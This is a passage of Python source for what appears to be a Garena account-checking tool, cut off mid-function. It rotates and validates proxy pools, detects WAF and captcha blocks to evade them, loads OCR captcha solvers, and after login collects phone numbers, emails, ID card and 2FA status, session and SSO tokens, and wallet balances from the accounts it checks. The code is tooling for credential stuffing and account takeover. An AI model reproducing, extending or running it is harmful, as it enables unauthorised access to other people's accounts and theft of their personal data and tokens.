import socket
import struct
import hashlib
import os
import json
import time
import sys
import random
import re
import unicodedata
import urllib.parse
import uuid
import threading
import datetime as _dt
from concurrent.futures import ThreadPoolExecutor, as_completed
from io import BytesIO

if hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass
if hasattr(sys.stderr, 'reconfigure'):
    try:
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass

cv2 = None
_np = None
Image = None
ImageFilter = None
ddddocr = None

def _ensure_captcha_libs():
    """Lazy loader for heavy image processing and OCR libraries."""
    global cv2, _np, Image, ImageFilter, ddddocr
    if cv2 is None or _np is None:
        try:
            import cv2 as _cv2
            import numpy as _numpy
            cv2 = _cv2
            _np = _numpy
        except ImportError:
            pass
    if Image is None:
        try:
            from PIL import Image as _Img, ImageFilter as _ImgFilter
            Image = _Img
            ImageFilter = _ImgFilter
        except ImportError:
            pass
    if ddddocr is None:
        try:
            import ddddocr as _ddddocr
            ddddocr = _ddddocr
        except ImportError:
            pass


class C:
    RESET  = "\033[0m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    # Foreground
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    GRAY   = "\033[90m"
    # Background
    BG_GREEN  = "\033[42m"
    BG_RED    = "\033[41m"
    BG_YELLOW = "\033[43m"
    BG_BLUE   = "\033[44m"
    BG_CYAN   = "\033[46m"


def _enable_ansi():
    """Enable ANSI codes on Windows console."""
    if sys.platform == "win32":
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        except Exception:
            pass


_enable_ansi()


def _c(color: str, text: str) -> str:
    """Wrap text in ANSI color (noop if not a tty)."""
    if not sys.stdout.isatty():
        return text
    return f"{color}{text}{C.RESET}"


def _is_yes(value) -> bool:
    """Normalize common YES/TRUE flags from mixed API payload types."""
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return value != 0
    if isinstance(value, str):
        return value.strip().upper() in {
            "YES", "Y", "TRUE", "1", "ON", "BAN", "BANNED"
        }
    return False


def _norm_unix_ts(v) -> int:
    """Normalize seconds/milliseconds unix timestamp to seconds."""
    try:
        t = int(float(v or 0))
    except Exception:
        return 0
    if t <= 0:
        return 0
    # ms → s (và lỡ 2 lớp ms)
    while t > 10_000_000_000:
        t //= 1000
    # Windows fromtimestamp: roughly 1970..3000
    if t < 0 or t > 32_503_680_000:  # ~ year 3000
        return 0
    return t


def _safe_fromtimestamp(v, fmt: str = "%Y-%m-%d %H:%M:%S") -> str:
    """
    Safe datetime format for Windows — never raise OSError [Errno 22]
    when ts is ms, out-of-range, or garbage.
    """
    ts = _norm_unix_ts(v)
    if not ts:
        return ""
    # epoch / pre-2000 rác (created_time=0 → 1970) — không hiển thị
    if ts < 946_684_800:  # 2000-01-01
        return ""
    try:
        return _dt.datetime.fromtimestamp(ts).strftime(fmt)
    except (OSError, OverflowError, ValueError, TypeError):
        return ""


def _safe_dt_to_ts(dt) -> int:
    """datetime → unix seconds; Windows-safe (no Errno 22 on 1970/out-of-range)."""
    if dt is None:
        return 0
    if not isinstance(dt, _dt.datetime):
        return _norm_unix_ts(dt)
    try:
        if dt.tzinfo is not None:
            dt = dt.replace(tzinfo=None)
        # Windows: timestamp() fails for local times before 1970-01-01 UTC
        if dt.year < 2000:
            return 0
        ts = int(dt.timestamp())
        return _norm_unix_ts(ts)
    except (OSError, OverflowError, ValueError, TypeError):
        return 0


def _is_banned_info(ban_info) -> bool:
    """
    Detect active banned state from `banInfo` payload.
    Avoid treating every non-empty object as banned.
    """
    if ban_info is None:
        return False
    if _is_yes(ban_info):
        return True
    if isinstance(ban_info, str):
        s = ban_info.strip().lower()
        if not s:
            return False
        if s in {"no", "none", "null", "false", "0", "ok", "unbanned", "not_banned", "not banned"}:
            return False
        return "ban" in s and "unban" not in s
    if isinstance(ban_info, dict):
        if not ban_info:
            return False
        for key in ("isBan", "isBanned", "banned", "ban", "active"):
            if key in ban_info and _is_yes(ban_info.get(key)):
                return True
        for key in ("status", "state", "banStatus"):
            v = ban_info.get(key)
            if isinstance(v, str) and v.strip().lower() in {
                "banned", "ban", "active_ban", "is_banned", "locked"
            }:
                return True

        now_ts = int(time.time())

        # Common "ban until" keys from multiple APIs.
        for key in ("endTime", "banEndTime", "expireAt", "expiredAt", "unbanTime"):
            until = _norm_unix_ts(ban_info.get(key))
            if until > now_ts:
                return True

        # banTime + unbanTime window (kientuong returns this shape).
        ban_at = _norm_unix_ts(ban_info.get("banTime"))
        unban_at = _norm_unix_ts(ban_info.get("unbanTime"))
        if ban_at and unban_at and ban_at <= now_ts < unban_at:
            return True
        if ban_at and not unban_at and ban_at <= now_ts:
            return True

        return False
    if isinstance(ban_info, (list, tuple, set)):
        return any(_is_banned_info(item) for item in ban_info)
    return False


def _print_banner():
    banner = f"""
"""
    print(banner)


try:
    import requests as _requests
    _requests.packages.urllib3.disable_warnings()
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

# Data integrity: sanitize HIT + append an toàn (flush/fsync) + JSONL recovery
try:
    import data_guard as _data_guard
except ImportError:
    _data_guard = None

# ── API dump / extra discovery (opt-in: GARENA_API_DUMP=1) ──────────────────
# Ghi raw payload + quét key lạ — không bao giờ làm mất HIT / đè field tốt.
_API_DUMP_ENABLED = os.environ.get("GARENA_API_DUMP", "").strip().lower() in (
    "1", "true", "yes", "on",
)
_API_DUMP_DIR = (os.environ.get("GARENA_API_DUMP_DIR", "") or "").strip()
_API_DUMP_LOCK = threading.Lock()
_EXTRA_KEYS_SEEN = set()
_INTERESTING_KEY_RE = re.compile(
    r"(phone|mobile|email|mail|rank|skin|shell|level|ban|password|auth|"
    r"fb|facebook|idcard|cccd|country|region|openid|token|uid|user|sso|"
    r"session|star|hero|champ|cp|bind|secure|suspicious|whitelist|avatar|"
    r"nickname|username|role|job|grade|prefill|verify|2fa|otp|wallet|"
    r"balance|diamond|coin|vip|server|guild|clan)",
    re.I,
)
# Thứ tự fetch sau login (tokens TRƯỚC TCP dài / hay block)
INFO_FETCH_ORDER = (
    "sso_key",           # CMD 442 — bắt buộc cho account center
    "session_token",     # CMD 278
    "account_security",  # HTTP account/init (Email/SĐT/CCCD/2FA)
    "login_info",        # CMD 276 region/shells
    "user_basic",        # CMD 289
    "account_info_tcp",  # CMD 342 (hay timeout — sau tokens)
    "fb_info",           # CMD 467
    "oauth_aov",         # OAuth Liên Quân
    "http_parallel",     # weekly / skins / uac / napthe / kgcamp
    "kientuong",         # player profile
)


def _api_dump_dir() -> str:
    if _API_DUMP_DIR:
        return _API_DUMP_DIR
    return os.path.join("res", "api_dumps")


def dump_api_payload(name: str, payload, meta: dict = None, force: bool = False) -> str:
    """
    Ghi raw API/TCP payload ra disk khi GARENA_API_DUMP=1 (hoặc force=True).
    Offline-safe: lỗi I/O → '' (không raise). Trả path đã ghi hoặc ''.
    """
    if not force and not _API_DUMP_ENABLED:
        return ""
    try:
        safe = re.sub(r"[^\w.\-]+", "_", str(name or "payload"))[:80] or "payload"
        base = _api_dump_dir()
        os.makedirs(base, exist_ok=True)
        ts = int(time.time() * 1000)
        path = os.path.join(base, f"{safe}_{ts}_{os.getpid()}.json")
        rec = {
            "name": str(name or ""),
            "ts": ts,
            "meta": meta if isinstance(meta, dict) else {},
            "payload": payload,
        }
        raw = json.dumps(rec, ensure_ascii=False, default=str, separators=(",", ":"))
        with _API_DUMP_LOCK:
            with open(path, "a", encoding="utf-8", newline="\n") as f:
                f.write(raw)
                f.write("\n")
                f.flush()
                try:
                    os.fsync(f.fileno())
                except Exception:
                    pass
        return path
    except Exception:
        return ""


def extra_search_keys(obj, max_depth: int = 6, max_hits: int = 100,
                      known_fields=None) -> dict:
    """
    Quét nested JSON/proto-dict tìm key thú vị chưa map vào HIT.
    Trả {path: sample_value} — không side-effect network.
    """
    known = set(known_fields or ())
    found = {}
    if obj is None:
        return found

    def _walk(node, path: str, depth: int):
        if depth > max_depth or len(found) >= max_hits:
            return
        if isinstance(node, dict):
            for k, v in node.items():
                ks = str(k)
                p = f"{path}.{ks}" if path else ks
                kl = ks.lower()
                if (
                    _INTERESTING_KEY_RE.search(ks)
                    and kl not in known
                    and p not in found
                    and v not in (None, "", [], {})
                ):
                    if isinstance(v, (str, int, float, bool)):
                        found[p] = v
                    elif isinstance(v, dict):
                        found[p] = f"<dict:{len(v)}>"
                    elif isinstance(v, (list, tuple)):
                        found[p] = f"<list:{len(v)}>"
                    else:
                        found[p] = type(v).__name__
                    try:
                        _EXTRA_KEYS_SEEN.add(kl)
                    except Exception:
                        pass
                if isinstance(v, (dict, list, tuple)):
                    _walk(v, p, depth + 1)
        elif isinstance(node, (list, tuple)):
            for i, item in enumerate(node[:30]):
                if isinstance(item, (dict, list, tuple)):
                    _walk(item, f"{path}[{i}]", depth + 1)

    try:
        _walk(obj, "", 0)
    except Exception:
        pass
    return found


def extra_dump_and_search(name: str, payload, known_fields=None,
                          meta: dict = None, force: bool = False) -> dict:
    """
    Dump raw + extra key scan. Always safe offline (no network).
    Returns {dump_path, extra_keys, name}.
    """
    path = dump_api_payload(name, payload, meta=meta, force=force)
    keys = extra_search_keys(payload, known_fields=known_fields)
    if keys and (_API_DUMP_ENABLED or force):
        try:
            dump_api_payload(
                f"{name}__extra_keys",
                keys,
                meta={"parent": name, "count": len(keys)},
                force=force,
            )
        except Exception:
            pass
    return {"dump_path": path or "", "extra_keys": keys, "name": str(name or "")}


def apply_extra_discovered_fields(result: dict, extra_keys: dict) -> int:
    """
    Map nhẹ một số key lạ hay gặp vào HIT (non-destructive).
    Trả số field mới gắn được.
    """
    if not isinstance(result, dict) or not isinstance(extra_keys, dict):
        return 0
    n = 0
    # path → value samples from extra_search
    for path, val in extra_keys.items():
        pl = str(path).lower()
        if val in (None, "", [], {}):
            continue
        try:
            if ("prefill_mobile" in pl or pl.endswith("mobile_no") or pl.endswith(".mobile")) and not _truthy_mask(result.get("masked_phone")) and not _truthy_mask(result.get("aov_prefill_mobile")):
                s = str(val).strip()
                if _truthy_mask(s) and any(ch.isdigit() for ch in s):
                    result["aov_prefill_mobile"] = s
                    result["mobile_bound"] = True
                    n += 1
            elif ("rankgradestar" in pl or pl.endswith("rank_stars") or "star_num" in pl) and not int(result.get("aov_rank_stars") or 0):
                try:
                    st = int(float(val))
                    if st > 0:
                        result["aov_rank_stars"] = st
                        n += 1
                except Exception:
                    pass
            elif ("rolejobname" in pl or pl.endswith("rank_name")) and not (result.get("aov_rank") or "").strip():
                s = str(val).strip()
                if s and not s.isdigit():
                    result["aov_rank"] = s
                    n += 1
            elif ("shell" in pl or "wallet" in pl or "balance" in pl) and isinstance(val, (int, float)):
                try:
                    sh = int(val)
                    if sh > int(result.get("shells") or 0):
                        result["shells"] = sh
                        n += 1
                except Exception:
                    pass
            elif ("level" in pl or pl.endswith(".lv")) and isinstance(val, (int, float)):
                try:
                    lv = int(val)
                    if lv > int(result.get("aov_level") or 0):
                        result["aov_level"] = lv
                        n += 1
                except Exception:
                    pass
        except Exception:
            continue
    if n:
        result["_extra_fields_applied"] = int(result.get("_extra_fields_applied") or 0) + n
    return n



# ── Server ──────────────────────────────────────────────────────────────────
HOST = "mconnect.gxx.garenanow.com"
PORT = 19000
_KNOWN_GXX_IPS = [f"103.247.205.{i}" for i in range(14, 25)]
# Dùng trực tiếp IP cố định của cụm máy chủ Garena để triệt tiêu độ trễ phân giải DNS
_HOST_IP = "103.247.205.14"
_HOST_IP_lock = threading.Lock()
# VN/residential proxy ports thường là HTTP CONNECT, không phải SOCKS5.
_HTTP_PROXY_PORTS = frozenset({
    80, 81, 443, 3128, 3129, 8000, 8080, 8081, 8888, 9000, 10000, 20000, 20007,
})

def _resolve_host_ip(timeout: int = 2) -> str:
    """Trả về IP máy chủ Garena trực tiếp, không phân giải DNS lặp lại."""
    global _HOST_IP
    if _HOST_IP:
        return _HOST_IP
    _HOST_IP = "103.247.205.14"
    return _HOST_IP

def _make_fast_socket(timeout: int = 20):
    """Create a standard reliable socket for Windows."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except Exception:
        pass
    sock.settimeout(timeout)
    return sock

# ── Shared HTTP thread pool (parallel per-account HTTP fetches) ─────────────
_HTTP_POOL      = None
_HTTP_POOL_LOCK = __import__('threading').Lock()
_HTTP_SESSION_LOCAL = threading.local()

def _ensure_http_pool():
    global _HTTP_POOL
    if _HTTP_POOL is not None:
        return _HTTP_POOL
    with _HTTP_POOL_LOCK:
        if _HTTP_POOL is None:
            _HTTP_POOL = ThreadPoolExecutor(max_workers=500, thread_name_prefix='garena_http')
    return _HTTP_POOL


def _invalidate_http_session(proxy=None):
    """Drop cached requests.Session for a proxy (force fresh cookies on retry)."""
    if not HAS_REQUESTS:
        return
    proxies = _get_http_proxies(proxy) or {}
    proxy_key = proxies.get("http", "")
    cache = getattr(_HTTP_SESSION_LOCAL, "cache", None)
    if not cache or proxy_key not in cache:
        return
    try:
        cache[proxy_key].close()
    except Exception:
        pass
    del cache[proxy_key]


def _get_http_session(proxy=None):
    """Reuse requests.Session per thread + proxy to reduce connection churn."""
    if not HAS_REQUESTS:
        return None
    proxies = _get_http_proxies(proxy) or {}
    proxy_key = proxies.get("http", "")
    cache = getattr(_HTTP_SESSION_LOCAL, "cache", None)
    if cache is None:
        cache = {}
        _HTTP_SESSION_LOCAL.cache = cache
    sess = cache.get(proxy_key)
    if sess is None:
        sess = _requests.Session()
        sess.verify = False
        try:
            from requests.adapters import HTTPAdapter
            adapter = HTTPAdapter(pool_connections=64, pool_maxsize=64, max_retries=0)
            sess.mount("http://", adapter)
            sess.mount("https://", adapter)
        except Exception:
            pass
        if proxies:
            sess.proxies = proxies
        cache[proxy_key] = sess
    else:
        sess.proxies = proxies
    try:
        sess.cookies.clear()
        sess.headers.clear()
    except Exception:
        pass
    return sess


# ── Proxy ───────────────────────────────────────────────────────────────────
_proxy_list = []   # list of (ip, port, user, password) or (ip, port, None, None)
_proxy_idx  = 0
_proxy_deck = []
_proxy_lock = __import__('threading').Lock()
_save_lock  = __import__('threading').Lock()
_print_lock = __import__('threading').Lock()
_QUIET_BULK = False
_thread_ctx = threading.local()
_PROXY_ROTATE_MODE = False

# Cache: (ip, port) -> 'socks5' | 'http'  (detected on first use)
_proxy_type_cache: dict = {}
_DIRECT_MAX_WORKERS = 72
_DIRECT_CONNECT_ATTEMPTS = 2
_DIRECT_LOGIN_RETRIES = 2
_DIRECT_LOGIN_TIMEOUT = 18
_INFO_FETCH_TIMEOUT = 28
_ACCT_SEC_RETRIES = 3
_ACCT_SEC_HTTP_TIMEOUT = 15
_TCP_INFO_RETRIES = 2
_SSO_KEY_RETRIES = 3
_SKIN_FETCH_RETRIES = 2
_SKIN_HTTP_TIMEOUT = 14

# ── Connection Semaphore ────────────────────────────────────────────────────
# Gioi han so socket TCP mo dong thoi, tranh Windows het ephemeral port (WinError 10048).
# Neu chay nhieu threads, day la cai fix thuc su ── threads co the cao tuy muon
# nhung chi toi da _MAX_CONN socket duoc ket noi cung luc.
_MAX_CONN  = 100                            # chinh soban nay neu can
_conn_sem  = __import__('threading').Semaphore(_MAX_CONN)

def load_proxies(filepath: str):
    """Load proxies from file.
    Formats: ip:port, ip:port:user:pass, http(s)://ip:port, socks5://ip:port.
    """
    global _proxy_list, _proxy_idx, _proxy_deck
    proxies = []
    scheme_cache = {}
    with open(filepath, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'): continue
            try:
                scheme = ""
                if "://" in line:
                    parsed = urllib.parse.urlparse(line)
                    scheme = (parsed.scheme or "").lower()
                    host = (parsed.hostname or "").strip()
                    port = int(parsed.port)
                    user = urllib.parse.unquote(parsed.username or "").strip() or None
                    pw = urllib.parse.unquote(parsed.password or "").strip() or None
                    proxy = (host, port, user, pw)
                    proxies.append(proxy)
                    if scheme.startswith("socks"):
                        scheme_cache[(host, port)] = "socks5"
                    elif scheme in {"http", "https"}:
                        scheme_cache[(host, port)] = "http"
                    continue
                parts = line.split(':')
                if len(parts) >= 4:
                    proxies.append((parts[0].strip(), int(parts[1]), parts[2].strip(), ':'.join(parts[3:]).strip()))
                elif len(parts) >= 2:
                    p = (parts[0].strip(), int(parts[1]), None, None)
                    proxies.append(p)
                    scheme_cache[(p[0], p[1])] = _guess_proxy_type(p[1])
            except (TypeError, ValueError):
                continue
    with _proxy_lock:
        _proxy_list = proxies
        _proxy_idx = 0
        _proxy_deck = []
    if scheme_cache:
        with _proxy_type_lock:
            _proxy_type_cache.update(scheme_cache)


def _proxy_key(proxy):
    if not proxy:
        return None
    return proxy[0], proxy[1]


def _mark_proxy_good(proxy):
    return


def _remove_proxy(proxy, reason: str = "") -> bool:
    """Remove a dead/blocked proxy from the active rotation."""
    global _proxy_list, _proxy_idx, _proxy_deck
    key = _proxy_key(proxy)
    if not key:
        return False
    with _proxy_lock:
        old_len = len(_proxy_list)
        if not old_len:
            return False
        _proxy_list = [p for p in _proxy_list if _proxy_key(p) != key]
        _proxy_deck = [p for p in _proxy_deck if _proxy_key(p) != key]
        removed = len(_proxy_list) != old_len
        if removed:
            _proxy_idx %= max(1, len(_proxy_list))
    with _proxy_type_lock:
        _proxy_type_cache.pop(key, None)
    return removed


def _mark_proxy_bad(proxy, reason: str = ""):
    key = _proxy_key(proxy)
    if not key:
        return
    _remove_proxy(proxy, reason)


def _guess_proxy_type(port: int) -> str:
    """Heuristic: VN proxy port 20007 etc. are HTTP CONNECT, not SOCKS5."""
    return "http" if int(port) in _HTTP_PROXY_PORTS else "socks5"


def _proxy_tcp_alive(proxy, timeout: int = 4) -> bool:
    """Quick check: proxy host:port accepts TCP (filters WinError 10061)."""
    if not proxy:
        return False
    ip, port = proxy[0], int(proxy[1])
    s = None
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        return True
    except Exception:
        return False
    finally:
        if s:
            try:
                s.close()
            except Exception:
                pass


def _pick_live_proxy(acc_idx: int = 0, max_scan: int = 25):
    """Return first proxy that accepts TCP; rotate from acc_idx."""
    with _proxy_lock:
        pool = list(_proxy_list)
    if not pool:
        return None
    n = len(pool)
    max_scan = max(1, min(int(max_scan or 1), n))
    for i in range(max_scan):
        proxy = pool[(acc_idx + i) % n]
        if _proxy_tcp_alive(proxy):
            return proxy
        _mark_proxy_bad(proxy, "proxy_tcp_dead")
    return None


def _garena_connect_targets() -> list:
    """IP candidates for proxy tunnel / direct connect (direct IP first for 0ms DNS)."""
    targets = [_resolve_host_ip()]
    for ip in _KNOWN_GXX_IPS:
        if ip not in targets:
            targets.append(ip)
    if HOST not in targets:
        targets.append(HOST)
    return targets


def _test_proxy(proxy, timeout: int = 6) -> str:
    """Quick test a proxy. Returns 'socks5', 'http', or raises exception."""
    ip, port, user, pw = proxy
    # Test SOCKS5
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        s.sendall(b'\x05\x02\x00\x02' if user and pw else b'\x05\x01\x00')
        resp = s.recv(2)
        if len(resp) == 2 and resp[0] == 5 and resp[1] in (0, 2):
            return 'socks5'
    except Exception:
        pass
    finally:
        try:
            if s:
                s.close()
        except Exception:
            pass
    # Test HTTP CONNECT
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        connect_line = 'CONNECT 1.1.1.1:80 HTTP/1.1\r\nHost: 1.1.1.1:80\r\n'
        if user and pw:
            import base64
            cred = base64.b64encode(f"{user}:{pw}".encode()).decode()
            connect_line += f"Proxy-Authorization: Basic {cred}\r\n"
        connect_line += "\r\n"
        s.sendall(connect_line.encode())
        resp = s.recv(32)
        if b'HTTP' in resp or b'200' in resp or b'407' in resp:
            return 'http'
    except Exception:
        pass
    finally:
        try:
            if s:
                s.close()
        except Exception:
            pass
    raise ConnectionError(f"Proxy {ip}:{port} không phản hồi (dead/cần auth)")

def validate_proxies_tcp(print_fn=print, batch_size: int = 100, timeout: int = 3) -> int:
    """Fast filter: drop proxies that refuse TCP (WinError 10061 / timeout)."""
    global _proxy_list, _proxy_idx, _proxy_deck
    if not _proxy_list:
        return 0
    with _proxy_lock:
        proxies = list(_proxy_list)
    live = []
    dead = 0
    batch_size = max(1, min(int(batch_size or 100), 200))
    total = len(proxies)
    for start in range(0, total, batch_size):
        batch = proxies[start:start + batch_size]
        with ThreadPoolExecutor(max_workers=len(batch)) as ex:
            futs = {ex.submit(_proxy_tcp_alive, p, timeout): p for p in batch}
            for fut in as_completed(futs):
                proxy = futs[fut]
                if fut.result():
                    live.append(proxy)
                else:
                    dead += 1
        print_fn(_c(C.GRAY, f"  TCP batch {min(start + len(batch), total)}/{total} | live={len(live)} | dead={dead}"))
    with _proxy_lock:
        _proxy_list = live
        _proxy_idx = 0
        _proxy_deck = []
    if dead:
        print_fn(_c(C.RED, f"  [!] {dead} proxy TCP chet (10061/timeout) da loai."))
    if live:
        print_fn(_c(C.GREEN, f"  [✓] {len(live)} proxy TCP con song."))
    else:
        print_fn(_c(C.RED, "  [!!] Khong co proxy nao con song!"))
    return len(live)


def validate_proxies(print_fn=print, batch_size: int = 100, timeout: int = 4) -> int:
    """Test loaded proxies in bounded parallel batches and remove dead ones."""
    global _proxy_list, _proxy_idx, _proxy_deck
    if not _proxy_list:
        return 0
    with _proxy_lock:
        proxies = list(_proxy_list)
    live = []
    dead = 0

    def _validate_one(proxy):
        ip, port = proxy[0], proxy[1]
        try:
            return proxy, _test_proxy(proxy, timeout=timeout), None
        except Exception as exc:
            return proxy, None, exc

    batch_size = max(1, min(int(batch_size or 100), 300))
    total = len(proxies)
    for start in range(0, total, batch_size):
        batch = proxies[start:start + batch_size]
        with ThreadPoolExecutor(max_workers=len(batch)) as ex:
            futures = [ex.submit(_validate_one, proxy) for proxy in batch]
            for fut in as_completed(futures):
                proxy, ptype, exc = fut.result()
                if ptype:
                    ip, port = proxy[0], proxy[1]
                    with _proxy_type_lock:
                        _proxy_type_cache[(ip, port)] = ptype
                    live.append(proxy)
                else:
                    dead += 1
        print_fn(_c(C.GRAY, f"  Proxy batch {min(start + len(batch), total)}/{total} | live={len(live)} | dead={dead}"))

    with _proxy_lock:
        _proxy_list = live
        _proxy_idx = 0
        _proxy_deck = []
    if dead:
        print_fn(_c(C.RED, f"  [!] {dead} proxy chết/không phản hồi đã bị loại bỏ."))
    if not live:
        print_fn(_c(C.RED, "  [!!] Không có proxy nào hoạt động! Checker sẽ dùng kết nối trực tiếp."))
    else:
        print_fn(_c(C.GREEN, f"  [✓] {len(live)} proxy hoạt động."))
    return len(live)


_BLOCKED_BODY_HINTS = (
    'datadome', 'access denied', 'blocked', 'captcha-delivery',
    'cloudflare', 'forbidden country', 'request blocked',
    'please enable cookies', 'cf-ray', 'attention required',
)
# Lỗi proxy / gateway — không phải 404/401 từ Garena.
_PROXY_GATEWAY_FAIL_CODES = {407, 502, 503, 504}
# HTTP 1xx-4xx = server Garena đã phản hồi qua proxy → coi là ĐẠT (kể cả 401/404).
# Chỉ fail khi: timeout, lỗi kết nối proxy, gateway 407/502/503/504, hoặc 403/5xx có body WAF.


def _response_body_snippet(resp, limit: int = 800) -> str:
    try:
        return (getattr(resp, 'text', '') or '')[:limit].lower()
    except Exception:
        return ''


def _http_probe_reachable(resp, probe_name: str = "") -> tuple:
    """
    Kiểm tra proxy có TỚI ĐƯỢC server Garena không (không cần API trả 200).
    Trả về (ok: bool, detail: str) — detail dùng log/debug.
    """
    if resp is None:
        return False, "no_response"
    code = int(getattr(resp, 'status_code', 0) or 0)
    if code <= 0:
        return False, "status_0"

    body = _response_body_snippet(resp)
    if any(h in body for h in _BLOCKED_BODY_HINTS):
        return False, f"blocked_body HTTP {code}"

    if code in _PROXY_GATEWAY_FAIL_CODES:
        return False, f"proxy_gateway HTTP {code}"

    # 401/404/400 = chưa login hoặc thiếu param — bình thường khi probe không có token.
    if 100 <= code < 500:
        return True, f"reachable HTTP {code}"

    # 5xx: server đã nhận request qua proxy; chỉ fail nếu body giống WAF/block.
    if code >= 500:
        return True, f"reachable HTTP {code}"

    return False, f"unknown HTTP {code}"


# Probe proxy chỉ cần tới được trang Garena VN (nhẹ, đủ lọc proxy chết/block).
_GARENA_PROBE_URL = "https://www.garena.vn/"


def _probe_garena_vn(proxy, timeout: int = 8) -> tuple:
    """Probe https://www.garena.vn/ qua proxy. Returns (ok, detail)."""
    if not HAS_REQUESTS:
        return False, "no_requests"
    sess = None
    try:
        sess = _requests.Session()
        sess.verify = False
        # Random UA giống luồng check thật (desktop browser)
        headers = {"User-Agent": _random_desktop_browser_ua()}
        resp = sess.get(
            _GARENA_PROBE_URL,
            headers=headers,
            timeout=timeout,
            verify=False,
            proxies=_get_http_proxies(proxy),
            allow_redirects=True,
        )
        ok, detail = _http_probe_reachable(resp, "garena.vn")
        return ok, detail
    except Exception as exc:
        err = str(exc).lower()
        if 'proxy' in err:
            return False, f"proxy_error ({exc})"
        if 'timeout' in err or 'timed out' in err:
            return False, "timeout"
        if 'connection' in err or 'connect' in err:
            return False, f"connection_error ({exc})"
        return False, f"error ({exc})"
    finally:
        if sess:
            try:
                sess.close()
            except Exception:
                pass


def _validate_proxy_garena_all(proxy, timeout: int = 8):
    """
    Proxy phải handshake được + tới được https://www.garena.vn/.
    Returns (ok, failed_api, detail).
    """
    ip, port = proxy[0], proxy[1]
    try:
        ptype = _test_proxy(proxy, timeout=min(timeout, 6))
        with _proxy_type_lock:
            _proxy_type_cache[(ip, port)] = ptype
    except Exception as exc:
        return False, "proxy_handshake", str(exc)

    ok, detail = _probe_garena_vn(proxy, timeout=timeout)
    if not ok:
        return False, "garena.vn", detail
    return True, "", "all_ok"


def validate_proxies_garena(print_fn=print, batch_size: int = 50, timeout: int = 8) -> int:
    """Validate proxies via https://www.garena.vn/. Drop any that fail."""
    global _proxy_list, _proxy_idx, _proxy_deck, _PROXY_ROTATE_MODE
    if not _proxy_list:
        return 0
    with _proxy_lock:
        proxies = list(_proxy_list)
    live = []
    dead = 0
    fail_stats = {}
    fail_samples = {}

    def _validate_one(proxy):
        ok, failed_api, detail = _validate_proxy_garena_all(proxy, timeout=timeout)
        return proxy, ok, failed_api, detail

    batch_size = max(1, min(int(batch_size or 50), 100))
    total = len(proxies)
    print_fn(_c(C.YELLOW, f"  Kiem tra {total} proxy qua {_GARENA_PROBE_URL} ..."))
    print_fn(_c(C.GRAY, "  [i] HTTP 2xx/3xx/4xx = DAT (toi duoc server)."))
    print_fn(_c(C.GRAY, "  [i] Chi FAIL: timeout, loi proxy, 407/502/503/504, hoac body WAF/block."))
    for start_i in range(0, total, batch_size):
        batch = proxies[start_i:start_i + batch_size]
        with ThreadPoolExecutor(max_workers=len(batch)) as ex:
            futures = [ex.submit(_validate_one, proxy) for proxy in batch]
            for fut in as_completed(futures):
                proxy, ok, failed_api, detail = fut.result()
                if ok:
                    live.append(proxy)
                else:
                    dead += 1
                    fail_stats[failed_api] = fail_stats.get(failed_api, 0) + 1
                    if failed_api not in fail_samples:
                        fail_samples[failed_api] = detail
        print_fn(_c(C.GRAY, f"  Proxy batch {min(start_i + len(batch), total)}/{total} | pass={len(live)} | fail={dead}"))

    with _proxy_lock:
        _proxy_list = live
        _proxy_idx = 0
        _proxy_deck = []
    if dead:
        print_fn(_c(C.RED, f"  [!] {dead} proxy loi/khong toi duoc garena.vn da bi loai."))
        top = sorted(fail_stats.items(), key=lambda x: -x[1])[:6]
        for api_name, cnt in top:
            sample = fail_samples.get(api_name, "")
            print_fn(_c(C.GRAY, f"      - {api_name}: {cnt} proxy  (vd: {sample})"))
    if not live:
        print_fn(_c(C.RED, "  [!!] Khong co proxy nao toi duoc https://www.garena.vn/ !"))
    else:
        print_fn(_c(C.GREEN, f"  [✓] {len(live)} proxy dat chuan (garena.vn reachable)."))
        _PROXY_ROTATE_MODE = True
        print_fn(_c(C.CYAN, "  [i] Che do xoay proxy: 1 proxy / 1 acc (round-robin)."))
    return len(live)


def _next_proxy():
    """Return one proxy from a shuffled deck; reshuffle after all active proxies are used."""
    global _proxy_idx, _proxy_deck
    with _proxy_lock:
        if not _proxy_list:
            return None
        if _PROXY_ROTATE_MODE:
            proxy = _proxy_list[_proxy_idx % len(_proxy_list)]
            _proxy_idx = (_proxy_idx + 1) % len(_proxy_list)
            return proxy
        if not _proxy_deck:
            _proxy_deck = list(_proxy_list)
            random.shuffle(_proxy_deck)
            _proxy_idx = 0
        return _proxy_deck.pop()


def _proxy_for_account_index(acc_idx: int):
    """Round-robin: acc 1→proxy[0], acc 11→proxy[0], ..."""
    with _proxy_lock:
        if not _proxy_list:
            return None
        return _proxy_list[acc_idx % len(_proxy_list)]


def _proxy_fallback_for_account(acc_idx: int, attempt: int):
    """Next live proxy when assigned proxy died mid-check."""
    with _proxy_lock:
        if not _proxy_list:
            return None
        return _proxy_list[(acc_idx + attempt) % len(_proxy_list)]

def _get_http_proxies(proxy):
    """Build requests proxies dict from proxy tuple.
    Uses socks5:// if the proxy was detected as SOCKS5 (or not yet probed),
    else http://.
    """
    if not proxy:
        return None
    ip, port, user, pw = proxy
    ptype = _proxy_type_cache.get((ip, port), _guess_proxy_type(port))
    if ptype == 'socks5':
        if user and pw:
            url = f"socks5://{user}:{pw}@{ip}:{port}"
        else:
            url = f"socks5://{ip}:{port}"
    else:
        if user and pw:
